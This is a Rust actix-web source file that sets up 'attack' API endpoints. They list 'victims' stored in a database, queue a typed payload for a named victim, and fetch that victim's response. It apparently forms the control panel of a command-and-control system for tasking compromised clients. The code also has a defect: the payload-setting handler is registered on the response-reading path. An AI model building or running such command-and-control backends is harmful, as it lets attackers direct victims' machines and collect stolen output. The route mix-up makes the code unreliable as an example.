/*
 * Copyright (C) 2021  Aravinth Manivannan <realaravinth@batsense.net>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};

//use crate::errors::*;
use crate::AppData;

pub mod routes {
    pub struct Attack {
        pub list_victims: &'static str,
        pub set_payload: &'static str,
        pub read_response: &'static str,
    }

    impl Attack {
        pub const fn new() -> Attack {
            Attack {
                list_victims: "/api/v1/attack/join",
                set_payload: "/api/v1/attack/payload/set",
                read_response: "/api/v1/attack/payload/response",
            }
        }
    }
}

pub fn services(cfg: &mut actix_web::web::ServiceConfig) {
    cfg.service(list_victims);
    cfg.service(set_payload);
    cfg.service(read_response);
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Victim {
    pub name: String,
}

#[my_codegen::post(path = "crate::V1_API_ROUTES.attack.list_victims")]
async fn list_victims(
    data: AppData,
    //) -> ServiceResult<impl Responder> {
) -> impl Responder {
    let resp = sqlx::query_as!(Victim, "SELECT name FROM cic_victims")
        .fetch_all(&data.db)
        .await
        .unwrap();
    HttpResponse::Ok().json(resp)
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Payload {
    pub victim: String,
    pub payload_type: String,
    pub payload: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct PayloadID {
    pub id: i32,
}

#[my_codegen::post(path = "crate::V1_API_ROUTES.attack.read_response")]
async fn set_payload(data: AppData, payload: web::Json<Payload>) -> impl Responder {
    sqlx::query!(
        "INSERT INTO cic_messages (victim_id, payload_type, payload)
        VALUES 
            ((SELECT ID from cic_victims WHERE name = $1), $2, $3);",
        &payload.victim,
        &payload.payload_type,
        &payload.payload,
    )
    .execute(&data.db)
    .await
    .unwrap();

    let id = sqlx::query_as!(
        PayloadID,
        "SELECT id FROM cic_messages 
        WHERE 
            victim_id = (SELECT ID from cic_victims WHERE name = $1)
        AND payload_type = $2
        AND payload = $3;",
        &payload.victim,
        &payload.payload_type,
        &payload.payload,
    )
    .fetch_one(&data.db)
    .await
    .unwrap();

    HttpResponse::Ok().json(id)
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct PayloadResponse {
    pub response: Option<String>,
}

#[my_codegen::post(path = "crate::V1_API_ROUTES.attack.read_response")]
async fn read_response(
    data: AppData,
    payload: web::Json<PayloadID>,
    //) -> ServiceResult<impl Responder> {
) -> impl Responder {
    let data = sqlx::query_as!(
        PayloadResponse,
        "SELECT response FROM cic_messages
        WHERE id = $1;",
        &payload.id,
    )
    .fetch_one(&data.db)
    .await
    .unwrap();
    HttpResponse::Ok().json(data)
}
